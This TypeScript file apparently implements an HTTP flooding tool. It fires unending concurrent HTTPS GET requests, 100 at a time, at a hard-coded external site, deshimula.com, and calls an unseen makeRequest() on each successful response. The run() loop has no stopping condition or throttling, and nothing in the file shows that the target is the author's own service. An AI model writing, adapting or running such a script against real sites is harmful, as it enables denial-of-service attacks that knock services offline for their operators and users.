import https from "https";
import { makeRequest } from "./makeRequest";

const targetUrl: string = "https://deshimula.com";

const concurrencyLimit: number = 100; // how many requests at once
let running: number = 0;
let completedRequests: number = 0;
let totalRequestsSent: number = 0; // just for logging

function makeSingleRequest(index: number): Promise<void> {
  return new Promise((resolve) => {
    https
      .get(targetUrl, (res: any) => {
        if (res.statusCode==200) {
          makeRequest();
        }
        console.log(`Status1: ${res.statusCode}, Count: ${index}`);
        res.on("data", () => {}); // consume data
        res.on("end", () => {
          completedRequests++;
          resolve();
        });
      })
      .on("error", (err: Error) => {
        console.error(`❌ Error: ${err.message}, Count: ${index}`);
        completedRequests++;
        resolve();
      });
  });
}

export async function run(): Promise<void> {
  while (true) {
    if (running < concurrencyLimit) {
      running++;
      totalRequestsSent++;
      makeSingleRequest(totalRequestsSent).then(() => {
        running--;
      });
    } else {
      // Wait a bit before checking again
      await new Promise((r) => setTimeout(r, 10));
    }
  }
}
